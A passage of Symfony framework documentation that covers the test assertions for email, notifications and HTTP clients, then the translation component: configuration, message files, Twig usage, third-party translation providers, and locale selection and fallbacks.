``assertEmailAddressContains(RawMessage $email, string $headerName, string $expectedValue, string $message = '')``
    Asserts that the given address header equals the expected e-mail
    address. This assertion normalizes addresses like ``Jane Smith
    <jane@example.com>`` into ``jane@example.com``.
``assertEmailSubjectContains(RawMessage $email, string $expectedValue, string $message = '')``/``assertEmailSubjectNotContains(RawMessage $email, string $expectedValue, string $message = '')``
    Asserts that the subject of the given email does (not) contain the
    expected subject.

Notifier Assertions
...................

``assertNotificationCount(int $count, ?string $transportName = null, string $message = '')``
    Asserts that the given number of notifications has been created
    (in total or for the given transport).
``assertQueuedNotificationCount(int $count, ?string $transportName = null, string $message = '')``
    Asserts that the given number of notifications are queued
    (in total or for the given transport).
``assertNotificationIsQueued(MessageEvent $event, string $message = '')``
    Asserts that the given notification is queued.
``assertNotificationIsNotQueued(MessageEvent $event, string $message = '')``
    Asserts that the given notification is not queued.
``assertNotificationSubjectContains(MessageInterface $notification, string $text, string $message = '')``
    Asserts that the given text is included in the subject of
    the given notification.
``assertNotificationSubjectNotContains(MessageInterface $notification, string $text, string $message = '')``
    Asserts that the given text is not included in the subject of
    the given notification.
``assertNotificationTransportIsEqual(MessageInterface $notification, string $transportName, string $message = '')``
    Asserts that the name of the transport for the given notification
    is the same as the given text.
``assertNotificationTransportIsNotEqual(MessageInterface $notification, string $transportName, string $message = '')``
    Asserts that the name of the transport for the given notification
    is not the same as the given text.

HttpClient Assertions
.....................

.. tip::

    For all the following assertions, ``$client->enableProfiler()`` must be
    called before the code that will trigger HTTP request(s).

``assertHttpClientRequest(string $expectedUrl, string $expectedMethod = 'GET', string|array|null $expectedBody = null, array $expectedHeaders = [], string $httpClientId = 'http_client')``
    Asserts that the given URL has been called using, if specified,
    the given method body and headers. By default it will check on the HttpClient,
    but you can also pass a specific HttpClient ID.
    (It will succeed if the request has been called multiple times.)

``assertNotHttpClientRequest(string $unexpectedUrl, string $expectedMethod = 'GET', string $httpClientId = 'http_client')``
    Asserts that the given URL has not been called using GET or the specified method.
    By default it will check on the HttpClient, but a HttpClient id can be specified.

``assertHttpClientRequestCount(int $count, string $httpClientId = 'http_client')``
    Asserts that the given number of requests has been made on the HttpClient.
    By default it will check on the HttpClient, but you can also pass a specific
    HttpClient ID.

End to End Tests (E2E)
~~~~~~~~~~~~~~~~~~~~~~

If you need to test the application as a whole, including the JavaScript
code, you can use a real browser instead of the test client. This is
called an end-to-end test and it's a great way to test the application.

This can be achieved thanks to the Panther component. You can learn more
about it in :doc:`the dedicated page </testing/end_to_end>`.

Learn more
----------

.. toctree::
    :maxdepth: 1
    :glob:

    testing/*
    /components/dom_crawler
    /components/css_selector

.. _`PHPUnit`: https://phpunit.de/
.. _`documentation`: https://docs.phpunit.de/
.. _`Writing Tests for PHPUnit`: https://docs.phpunit.de/en/10.5/writing-tests-for-phpunit.html
.. _`PHPUnit documentation`: https://docs.phpunit.de/en/10.5/configuration.html
.. _`unit test`: https://en.wikipedia.org/wiki/Unit_testing
.. _`DAMADoctrineTestBundle`: https://github.com/dmaicher/doctrine-test-bundle
.. _`Doctrine data fixtures`: https://symfony.com/doc/current/bundles/DoctrineFixturesBundle/index.html
.. _`DoctrineFixturesBundle documentation`: https://symfony.com/doc/current/bundles/DoctrineFixturesBundle/index.html
.. _`SymfonyMakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html
.. _`PHPUnit Assertion`: https://docs.phpunit.de/en/10.3/assertions.html
.. _`section 4.1.18 of RFC 3875`: https://tools.ietf.org/html/rfc3875#section-4.1.18
Translations
============

The term "internationalization" (often abbreviated `i18n`_) refers to the
process of abstracting strings and other locale-specific pieces out of your
application into a layer where they can be translated and converted based
on the user's locale (i.e. language and country). For text, this means
wrapping each with a function capable of translating the text (or "message")
into the language of the user::

    // text will *always* print out in English
    echo 'Hello World';

    // text can be translated into the end-user's language or
    // default to English
    echo $translator->trans('Hello World');

.. note::

    The term *locale* refers roughly to the user's language and country. It
    can be any string that your application uses to manage translations and
    other format differences (e.g. currency format). The `ISO 639-1`_
    *language* code, an underscore (``_``), then the `ISO 3166-1 alpha-2`_
    *country* code (e.g. ``fr_FR`` for French/France) is recommended.

Translations can be organized into groups, called **domains**. By default, all
messages use the default ``messages`` domain::

    echo $translator->trans('Hello World', domain: 'messages');

The translation process has several steps:

#. :ref:`Enable and configure <translation-configuration>` Symfony's
   translation service;

#. Abstract strings (i.e. "messages") by wrapping them in calls to the
   ``Translator`` (":ref:`translation-basic`");

#. :ref:`Create translation resources/files <translation-resources>`
   for each supported locale that translate each message in the application;

#. Determine, :ref:`set and manage the user's locale <translation-locale>`
   for the request and optionally
   :ref:`on the user's entire session <locale-sticky-session>`.

Installation
------------

First, run this command to install the translator before using it:

.. code-block:: terminal

    $ composer require symfony/translation

.. _translation-configuration:

Configuration
-------------

The previous command creates an initial config file where you can define the
default locale of the application and the directory where the translation files
are located:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/translation.yaml
        framework:
            default_locale: 'en'
            translator:
                default_path: '%kernel.project_dir%/translations'

    .. code-block:: xml

        <!-- config/packages/translation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config default-locale="en">
                <framework:translator
                    default-path="%kernel.project_dir%/translations"
                />
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/translation.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework
                ->defaultLocale('en')
                ->translator()
                    ->defaultPath('%kernel.project_dir%/translations')
            ;
        };

.. tip::

    You can also define the :ref:`enabled_locales option <reference-translator-enabled-locales>`
    to restrict the locales that your application is available in.

.. _translation-basic:

Basic Translation
-----------------

Translation of text is done through the ``translator`` service
(:class:`Symfony\\Component\\Translation\\Translator`). To translate a block of
text (called a *message*), use the
:method:`Symfony\\Component\\Translation\\Translator::trans` method. Suppose,
for example, that you're translating a static message from inside a
controller::

    // ...
    use Symfony\Contracts\Translation\TranslatorInterface;

    public function index(TranslatorInterface $translator): Response
    {
        $translated = $translator->trans('Symfony is great');

        // ...
    }

.. _translation-resources:

When this code is run, Symfony will attempt to translate the message
"Symfony is great" based on the ``locale`` of the user. For this to work,
you need to tell Symfony how to translate the message via a "translation
resource", which is usually a file that contains a collection of translations
for a given locale. This "dictionary" of translations can be created in several
different formats:

.. configuration-block::

    .. code-block:: yaml

        # translations/messages.fr.yaml
        Symfony is great: J'aime Symfony

    .. code-block:: xml

        <!-- translations/messages.fr.xlf -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <xliff version="1.2" xmlns="urn:oasis:names:tc:xliff:document:1.2">
            <file source-language="en" datatype="plaintext" original="file.ext">
                <body>
                    <trans-unit id="symfony_is_great">
                        <source>Symfony is great</source>
                        <target>J'aime Symfony</target>
                    </trans-unit>
                </body>
            </file>
        </xliff>

    .. code-block:: php

        // translations/messages.fr.php
        return [
            'Symfony is great' => "J'aime Symfony",
        ];

For information on where these files should be located, see
:ref:`translation-resource-locations`.

Now, if the language of the user's locale is French (e.g. ``fr_FR`` or ``fr_BE``),
the message will be translated into ``J'aime Symfony``. You can also translate
the message inside your :ref:`templates <translation-in-templates>`.

.. _translation-real-vs-keyword-messages:

Using Real or Keyword Messages
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This example illustrates the two different philosophies when creating
messages to be translated::

    $translator->trans('Symfony is great');

    $translator->trans('symfony.great');

In the first method, messages are written in the language of the default
locale (English in this case). That message is then used as the "id"
when creating translations.

In the second method, messages are actually "keywords" that convey the
idea of the message. The keyword message is then used as the "id" for
any translations. In this case, translations must be made for the default
locale (i.e. to translate ``symfony.great`` to ``Symfony is great``).

The second method is handy because the message key won't need to be changed
in every translation file if you decide that the message should actually
read "Symfony is really great" in the default locale.

The choice of which method to use is entirely up to you, but the "keyword"
format is often recommended for multi-language applications, whereas for
shared bundles that contain translation resources we recommend the real
message, so your application can choose to disable the translator layer
and you will see a readable message.

Additionally, the ``php`` and ``yaml`` file formats support nested ids to
avoid repeating yourself if you use keywords instead of real text for your
ids:

.. configuration-block::

    .. code-block:: yaml

        symfony:
            is:
                # id is symfony.is.great
                great: Symfony is great
                # id is symfony.is.amazing
                amazing: Symfony is amazing
            has:
                # id is symfony.has.bundles
                bundles: Symfony has bundles
        user:
            # id is user.login
            login: Login

    .. code-block:: php

        [
            'symfony' => [
                'is' => [
                    // id is symfony.is.great
                    'great'   => 'Symfony is great',
                    // id is symfony.is.amazing
                    'amazing' => 'Symfony is amazing',
                ],
                'has' => [
                    // id is symfony.has.bundles
                    'bundles' => 'Symfony has bundles',
                ],
            ],
            'user' => [
                // id is user.login
                'login' => 'Login',
            ],
        ];

The Translation Process
~~~~~~~~~~~~~~~~~~~~~~~

To actually translate the message, Symfony uses the following process when
using the ``trans()`` method:

#. The ``locale`` of the current user, which is stored on the request is
   determined; this is typically set via a ``_locale`` attribute on your routes
   (see :ref:`translation-locale-url`);

#. A catalog of translated messages is loaded from translation resources
   defined for the ``locale`` (e.g. ``fr_FR``). Messages from the
   :ref:`fallback locale <translation-fallback>` and the
   :ref:`enabled locales <reference-translator-enabled-locales>` are also
   loaded and added to the catalog if they don't already exist. The end result
   is a large "dictionary" of translations.

#. If the message is located in the catalog, the translation is returned. If
   not, the translator returns the original message.

.. _message-placeholders:
.. _pluralization:

Message Format
--------------

Sometimes, a message containing a variable needs to be translated::

    // ...
    $translated = $translator->trans('Hello '.$name);

However, creating a translation for this string is impossible since the
translator will try to look up the message including the variable portions
(e.g. *"Hello Ryan"* or *"Hello Fabien"*).

Another complication is when you have translations that may or may not be
plural, based on some variable:

.. code-block:: text

    There is one apple.
    There are 5 apples.

To manage these situations, Symfony follows the `ICU MessageFormat`_ syntax by
using PHP's :phpclass:`MessageFormatter` class. Read more about this in
:doc:`/reference/formats/message_format`.

.. _translatable-objects:

Translatable Objects
--------------------

Sometimes translating contents in templates is cumbersome because you need the
original message, the translation parameters and the translation domain for
each content. Making the translation in the controller or services simplifies
your templates, but requires injecting the translator service in different
parts of your application and mocking it in your tests.

Instead of translating a string at the time of creation, you can use a
"translatable object", which is an instance of the
:class:`Symfony\\Component\\Translation\\TranslatableMessage` class. This object stores
all the information needed to fully translate its contents when needed::

    use Symfony\Component\Translation\TranslatableMessage;

    // the first argument is required and it's the original message
    $message = new TranslatableMessage('Symfony is great!');
    // the optional second argument defines the translation parameters and
    // the optional third argument is the translation domain
    $status = new TranslatableMessage('order.status', ['%status%' => $order->getStatus()], 'store');

Templates are now much simpler because you can pass translatable objects to the
``trans`` filter:

.. code-block:: html+twig

    <h1>{{ message|trans }}</h1>
    <p>{{ status|trans }}</p>

.. tip::

    The translation parameters can also be a :class:`Symfony\\Component\\Translation\\TranslatableMessage`.

.. tip::

    There's also a :ref:`function called t() <reference-twig-function-t>`,
    available both in Twig and PHP, as a shortcut to create translatable objects.

.. _translation-in-templates:

Translations in Templates
-------------------------

Most of the time, translation occurs in templates. Symfony provides native
support for both Twig and PHP templates.

.. _translation-filters:

Using Twig Filters
~~~~~~~~~~~~~~~~~~

The ``trans`` filter can be used to translate *variable texts* and complex expressions:

.. code-block:: twig

    {{ message|trans }}

    {{ message|trans({'%name%': 'Fabien'}, 'app') }}

.. tip::

    You can set the translation domain for an entire Twig template with a single tag:

    .. code-block:: twig

       {% trans_default_domain 'app' %}

    Note that this only influences the current template, not any "included"
    template (in order to avoid side effects).

By default, the translated messages are output escaped; apply the ``raw``
filter after the translation filter to avoid the automatic escaping:

.. code-block:: html+twig

    {% set message = '<h3>foo</h3>' %}

    {# strings and variables translated via a filter are escaped by default #}
    {{ message|trans|raw }}
    {{ '<h3>bar</h3>'|trans|raw }}

.. _translation-tags:

Using Twig Tags
~~~~~~~~~~~~~~~

Symfony provides a specialized Twig tag ``trans`` to help with message
translation of *static blocks of text*:

.. code-block:: twig

    {% trans %}Hello %name%{% endtrans %}

.. caution::

    The ``%var%`` notation of placeholders is required when translating in
    Twig templates using the tag.

.. tip::

    If you need to use the percent character (``%``) in a string, escape it by
    doubling it: ``{% trans %}Percent: %percent%%%{% endtrans %}``

You can also specify the message domain and pass some additional variables:

.. code-block:: twig

    {% trans with {'%name%': 'Fabien'} from 'app' %}Hello %name%{% endtrans %}

    {% trans with {'%name%': 'Fabien'} from 'app' into 'fr' %}Hello %name%{% endtrans %}

.. caution::

    Using the translation tag has the same effect as the filter, but with one
    major difference: automatic output escaping is **not** applied to translations
    using a tag.

Forcing the Translator Locale
-----------------------------

When translating a message, the translator uses the specified locale or the
``fallback`` locale if necessary. You can also manually specify the locale to
use for translation::

    $translator->trans('Symfony is great', locale: 'fr_FR');

Extracting Translation Contents and Updating Catalogs Automatically
-------------------------------------------------------------------

The most time-consuming task when translating an application is to extract all
the template contents to be translated and to keep all the translation files in
sync. Symfony includes a command called ``translation:extract`` that helps you
with these tasks:

.. code-block:: terminal

    # shows all the messages that should be translated for the French language
    $ php bin/console translation:extract --dump-messages fr

    # updates the French translation files with the missing strings for that locale
    $ php bin/console translation:extract --force fr

    # check out the command help to see its options (prefix, output format, domain, sorting, etc.)
    $ php bin/console translation:extract --help

The ``translation:extract`` command looks for missing translations in:

* Templates stored in the ``templates/`` directory (or any other directory
  defined in the :ref:`twig.default_path <config-twig-default-path>` and
  :ref:`twig.paths <config-twig-paths>` config options);
* Any PHP file/class that injects or :doc:`autowires </service_container/autowiring>`
  the ``translator`` service and makes calls to the ``trans()`` method.
* Any PHP file/class stored in the ``src/`` directory that creates
  :ref:`translatable-objects` using the constructor or the ``t()`` method or calls
  the ``trans()`` method.
* Any PHP file/class stored in the ``src/`` directory that uses
  :ref:`Constraints Attributes <validation-constraints>`  with ``*message`` named argument(s).

.. _translation-resource-locations:

Translation Resource/File Names and Locations
---------------------------------------------

Symfony looks for message files (i.e. translations) in the following default locations:

* the ``translations/`` directory (at the root of the project);
* the ``translations/`` directory inside of any bundle (and also their
  ``Resources/translations/`` directory, which is no longer recommended for bundles).

The locations are listed here with the highest priority first. That is, you can
override the translation messages of a bundle in the first directory.

The override mechanism works at a key level: only the overridden keys need
to be listed in a higher priority message file. When a key is not found
in a message file, the translator will automatically fall back to the lower
priority message files.

The filename of the translation files is also important: each message file
must be named according to the following path: ``domain.locale.loader``:

* **domain**: The translation domain;

* **locale**: The locale that the translations are for (e.g. ``en_GB``, ``en``, etc);

* **loader**: How Symfony should load and parse the file (e.g. ``xlf``,
  ``php``, ``yaml``, etc).

The loader can be the name of any registered loader. By default, Symfony
provides many loaders which are selected based on the following file extensions:

* ``.yaml``: YAML file (you can also use the ``.yml`` file extension);
* ``.xlf``: XLIFF file (you can also use the ``.xliff`` file extension);
* ``.php``: a PHP file that returns an array with the translations;
* ``.csv``: CSV file;
* ``.json``: JSON file;
* ``.ini``: INI file;
* ``.dat``, ``.res``: `ICU resource bundle`_;
* ``.mo``: `Machine object format`_;
* ``.po``: `Portable object format`_;
* ``.qt``: `QT Translations TS XML`_ file;

The choice of which loader to use is entirely up to you and is a matter of
taste. The recommended option is to use YAML for simple projects and use XLIFF
if you're generating translations with specialized programs or teams.

.. caution::

    Each time you create a *new* message catalog (or install a bundle
    that includes a translation catalog), be sure to clear your cache so
    that Symfony can discover the new translation resources:

    .. code-block:: terminal

        $ php bin/console cache:clear

.. note::

    You can add other directories with the :ref:`paths <reference-translator-paths>`
    option in the configuration:

    .. configuration-block::

        .. code-block:: yaml

            # config/packages/translation.yaml
            framework:
                translator:
                    paths:
                        - '%kernel.project_dir%/custom/path/to/translations'

        .. code-block:: xml

            <!-- config/packages/translation.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:framework="http://symfony.com/schema/dic/symfony"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-Instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd
                    http://symfony.com/schema/dic/symfony
                    https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

                <framework:config>
                    <framework:translator>
                        <framework:path>%kernel.project_dir%/custom/path/to/translations</framework:path>
                    </framework:translator>
                </framework:config>
            </container>

        .. code-block:: php

            // config/packages/translation.php
            use Symfony\Config\FrameworkConfig;

            return static function (FrameworkConfig $framework): void {
                $framework->translator()
                    ->paths(['%kernel.project_dir%/custom/path/to/translations'])
                ;
            };

Translations of Doctrine Entities
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Unlike the contents of templates, it's not practical to translate the contents
stored in Doctrine Entities using translation catalogs. Instead, use the
Doctrine `Translatable Extension`_ or the `Translatable Behavior`_. For more
information, read the documentation of those libraries.

Custom Translation Resources
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If your translations use a format not supported by Symfony or you store them
in a special way (e.g. not using files or Doctrine entities), you need to provide
a custom class implementing the :class:`Symfony\\Component\\Translation\\Loader\\LoaderInterface`
interface. See the :ref:`dic-tags-translation-loader` tag for more information.

.. _translation-providers:

Translation Providers
---------------------

When using external translators to translate your application, you must send
them the new contents to translate frequently and merge the results back in the
application.

Instead of doing this manually, Symfony provides integration with several
third-party translation services. You can upload and download (called "push"
and "pull") translations to/from these services and merge the results
automatically in the application.

Installing and Configuring a Third Party Provider
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Before pushing/pulling translations to a third-party provider, you must install
the package that provides integration with that provider:

====================  ===========================================================
Provider              Install with
====================  ===========================================================
Crowdin               ``composer require symfony/crowdin-translation-provider``
Loco (localise.biz)   ``composer require symfony/loco-translation-provider``
Lokalise              ``composer require symfony/lokalise-translation-provider``
Phrase                ``composer require symfony/phrase-translation-provider``
====================  ===========================================================

Each library includes a :ref:`Symfony Flex recipe <symfony-flex>` that will add
a configuration example to your ``.env`` file. For example, suppose you want to
use Loco. First, install it:

.. code-block:: terminal

    $ composer require symfony/loco-translation-provider

You'll now have a new line in your ``.env`` file that you can uncomment:

.. code-block:: env

    # .env
    LOCO_DSN=loco://API_KEY@default

The ``LOCO_DSN`` isn't a *real* address: it's a convenient format that offloads
most of the configuration work to Symfony. The ``loco`` scheme activates the
Loco provider that you just installed, which knows all about how to push and
pull translations via Loco. The *only* part you need to change is the
``API_KEY`` placeholder.

This table shows the full list of available DSN formats for each provider:

=====================  ==============================================================
Provider               DSN
=====================  ==============================================================
Crowdin                ``crowdin://PROJECT_ID:API_TOKEN@ORGANIZATION_DOMAIN.default``
Loco (localise.biz)    ``loco://API_KEY@default``
Lokalise               ``lokalise://PROJECT_ID:API_KEY@default``
Phrase                 ``phrase://PROJECT_ID:API_TOKEN@default?userAgent=myProject``
=====================  ==============================================================

To enable a translation provider, customize the DSN in your ``.env`` file and
configure the ``providers`` option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/translation.yaml
        framework:
            translator:
                providers:
                    loco:
                        dsn: '%env(LOCO_DSN)%'
                        domains: ['messages']
                        locales: ['en', 'fr']

    .. code-block:: xml

        <!-- config/packages/translation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:translator>
                    <framework:provider name="loco" dsn="%env(LOCO_DSN)%">
                        <framework:domain>messages</framework:domain>
                        <!-- ... -->
                        <framework:locale>en</framework:locale>
                        <framework:locale>fr</framework:locale>
                        <!-- ... -->
                    </framework:provider>
                </framework:translator>
            </framework:config>
        </container>

    .. code-block:: php

        # config/packages/translation.php
        $container->loadFromExtension('framework', [
            'translator' => [
                'providers' => [
                    'loco' => [
                        'dsn' => env('LOCO_DSN'),
                        'domains' => ['messages'],
                        'locales' => ['en', 'fr'],
                    ],
                ],
            ],
        ]);

.. important::

    If you use Phrase as a provider you must configure a user agent in your dsn. See
    `Identification via User-Agent`_ for reasoning and some examples.

    Also make the locale _names_ in Phrase should be as defined in RFC4646 (e.g. pt-BR rather than pt_BR).
    Not doing so will result in Phrase creating a new locale for the imported keys.

.. tip::

    If you use Crowdin as a provider and some of your locales are different from
    the `Crowdin Language Codes`_, you have to set the `Custom Language Codes`_ in the Crowdin project
    for each of your locales, in order to override the default value. You need to select the
    "locale" placeholder and specify the custom code in the "Custom Code" field.

.. tip::

    If you use Lokalise as a provider and a locale format following the `ISO
    639-1`_ (e.g. "en" or "fr"), you have to set the `Custom Language Name setting`_
    in Lokalise for each of your locales, in order to override the
    default value (which follow the `ISO 639-1`_ succeeded by a sub-code in
    capital letters that specifies the national variety (e.g. "GB" or "US"
    according to `ISO 3166-1 alpha-2`_)).

.. tip::

    The Phrase provider uses Phrase's tag feature to map translations to Symfony's translation
    domains. If you need some assistance with organising your tags in Phrase, you might want
    to consider the `Phrase Tag Bundle`_ which provides some commands helping you with that.

Pushing and Pulling Translations
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

After configuring the credentials to access the translation provider, you can
now use the following commands to push (upload) and pull (download) translations:

.. code-block:: terminal

    # push all local translations to the Loco provider for the locales and domains
    # configured in config/packages/translation.yaml file.
    # it will update existing translations already on the provider.
    $ php bin/console translation:push loco --force

    # push new local translations to the Loco provider for the French locale
    # and the validators domain.
    # it will **not** update existing translations already on the provider.
    $ php bin/console translation:push loco --locales fr --domains validators

    # push new local translations and delete provider's translations that not
    # exists anymore in local files for the French locale and the validators domain.
    # it will **not** update existing translations already on the provider.
    $ php bin/console translation:push loco --delete-missing --locales fr --domains validators

    # check out the command help to see its options (format, domains, locales, etc.)
    $ php bin/console translation:push --help

.. code-block:: terminal

    # pull all provider's translations to local files for the locales and domains
    # configured in config/packages/translation.yaml file.
    # it will overwrite completely your local files.
    $ php bin/console translation:pull loco --force

    # pull new translations from the Loco provider to local files for the French
    # locale and the validators domain.
    # it will **not** overwrite your local files, only add new translations.
    $ php bin/console translation:pull loco --locales fr --domains validators

    # check out the command help to see its options (format, domains, locales, intl-icu, etc.)
    $ php bin/console translation:pull --help

    # the "--as-tree" option will write YAML messages as a tree-like structure instead
    # of flat keys
    $ php bin/console translation:pull loco --force --as-tree

Creating Custom Providers
~~~~~~~~~~~~~~~~~~~~~~~~~

In addition to using Symfony's built-in translation providers, you can create
your own providers. To do so, you need to create two classes:

#. The first class must implement :class:`Symfony\\Component\\Translation\\Provider\\ProviderInterface`;
#. The second class needs to be a factory which will create instances of the first class. It must implement
:class:`Symfony\\Component\\Translation\\Provider\\ProviderFactoryInterface` (you can extend :class:`Symfony\\Component\\Translation\\Provider\\AbstractProviderFactory` to simplify its creation).

After creating these two classes, you need to register your factory as a service
and tag it with :ref:`translation.provider_factory <reference-dic-tags-translation-provider-factory>`.

.. _translation-locale:

Handling the User's Locale
--------------------------

Translating happens based on the user's locale. The locale of the current user
is stored in the request and is accessible via the ``Request`` object::

    use Symfony\Component\HttpFoundation\Request;

    public function index(Request $request): void
    {
        $locale = $request->getLocale();
    }

To set the user's locale, you may want to create a custom event listener so
that it's set before any other parts of the system (i.e. the translator) need
it::

        public function onKernelRequest(RequestEvent $event): void
        {
            $request = $event->getRequest();

            // some logic to determine the $locale
            $request->setLocale($locale);
        }

.. note::

    The custom listener must be called **before** ``LocaleListener``, which
    initializes the locale based on the current request. To do so, set your
    listener priority to a higher value than ``LocaleListener`` priority (which
    you can obtain by running the ``debug:event kernel.request`` command).

Read :ref:`locale-sticky-session` for more information on making the user's
locale "sticky" to their session.

.. note::

    Setting the locale using ``$request->setLocale()`` in the controller is
    too late to affect the translator. Either set the locale via a listener
    (like above), the URL (see next) or call ``setLocale()`` directly on the
    ``translator`` service.

See the :ref:`translation-locale-url` section below about setting the
locale via routing.

.. _translation-locale-url:

The Locale and the URL
~~~~~~~~~~~~~~~~~~~~~~

Since you can store the locale of the user in the session, it may be tempting
to use the same URL to display a resource in different languages based on the
user's locale. For example, ``http://www.example.com/contact`` could show
content in English for one user and French for another user. Unfortunately,
this violates a fundamental rule of the Web: that a particular URL returns the
same resource regardless of the user. To further muddy the problem, which
version of the content would be indexed by search engines?

A better policy is to include the locale in the URL using the
:ref:`special _locale parameter <routing-locale-parameter>`:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/ContactController.php
        namespace App\Controller;

        // ...
        class ContactController extends AbstractController
        {
            #[Route(
                path: '/{_locale}/contact',
                name: 'contact',
                requirements: [
                    '_locale' => 'en|fr|de',
                ],
            )]
            public function contact(): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        contact:
            path:       /{_locale}/contact
            controller: App\Controller\ContactController::index
            requirements:
                _locale: en|fr|de

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="contact" path="/{_locale}/contact">
                controller="App\Controller\ContactController::index">
                <requirement key="_locale">en|fr|de</requirement>
            </route>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\ContactController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            $routes->add('contact', '/{_locale}/contact')
                ->controller([ContactController::class, 'index'])
                ->requirements([
                    '_locale' => 'en|fr|de',
                ])
            ;
        };

When using the special ``_locale`` parameter in a route, the matched locale
is *automatically set on the Request* and can be retrieved via the
:method:`Symfony\\Component\\HttpFoundation\\Request::getLocale` method. In
other words, if a user visits the URI ``/fr/contact``, the locale ``fr`` will
automatically be set as the locale for the current request.

You can now use the locale to create routes to other translated pages in your
application.

.. tip::

    Define the locale requirement as a :ref:`container parameter <configuration-parameters>`
    to avoid hardcoding its value in all your routes.

.. _translation-default-locale:

Setting a Default Locale
~~~~~~~~~~~~~~~~~~~~~~~~

What if the user's locale hasn't been determined? You can guarantee that a
locale is set on each user's request by defining a ``default_locale`` for
the framework:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/translation.yaml
        framework:
            default_locale: en

    .. code-block:: xml

        <!-- config/packages/translation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config default-locale="en"/>
        </container>

    .. code-block:: php

        // config/packages/translation.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->defaultLocale('en');
        };

This ``default_locale`` is also relevant for the translator, as shown in the
next section.

Selecting the Language Preferred by the User
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If your application supports multiple languages, the first time a user visits your
site it's common to redirect them to the best possible language according to their
preferences. This is achieved with the ``getPreferredLanguage()`` method of the
:ref:`Request object <controller-request-argument>`::

    // get the Request object somehow (e.g. as a controller argument)
    $request = ...
    // pass an array of the locales (their script and region parts are optional) supported
    // by your application and the method returns the best locale for the current user
    $locale = $request->getPreferredLanguage(['pt', 'fr_Latn_CH', 'en_US'] );

Symfony finds the best possible language based on the locales passed as argument
and the value of the ``Accept-Language`` HTTP header. If it can't find a perfect
match between them, Symfony will try to find a partial match based on the language
(e.g. ``fr_CA`` would match ``fr_Latn_CH`` because their language is the same).
If there's no perfect or partial match, this method returns the first locale passed
as argument (that's why the order of the passed locales is important).

.. versionadded:: 7.1

    The feature to match locales partially was introduced in Symfony 7.1.

.. _translation-fallback:

Fallback Translation Locales
----------------------------

Imagine that the user's locale is ``es_AR`` and that you're translating the
key ``Symfony is great``. To find the Spanish translation, Symfony actually
checks translation resources for several locales:

#. First, Symfony looks for the translation in a ``es_AR`` (Argentinean
   Spanish) translation resource (e.g. ``messages.es_AR.yaml``);

#. If it wasn't found, Symfony looks for the translation in the
   parent locale, which is automatically defined only for some locales. In
   this example, the parent locale is ``es_419`` (Latin American Spanish);

#. If it wasn't found, Symfony looks for the translation in a ``es``
   (Spanish) translation resource (e.g. ``messages.es.yaml``);

#. If the translation still isn't found, Symfony uses the ``fallbacks`` option,
   which can be configured as follows. When this option is not defined, it
   defaults to the ``default_locale`` setting mentioned in the previous section.

   .. configuration-block::

       .. code-block:: yaml

           # config/packages/translation.yaml
           framework:
               translator:
                   fallbacks: ['en']
                   # ...

       .. code-block:: xml

           <!-- config/packages/translation.xml -->
           <?xml version="1.0" encoding="UTF-8" ?>
           <container xmlns="http://symfony.com/schema/dic/services"
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xmlns:framework="http://symfony.com/schema/dic/symfony"
               xsi:schemaLocation="http://symfony.com/schema/dic/services
                   https://symfony.com/schema/dic/services/services-1.0.xsd
                   http://symfony.com/schema/dic/symfony
                   https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

               <framework:config>
                   <framework:translator>
                       <framework:fallback>en</framework:fallback>
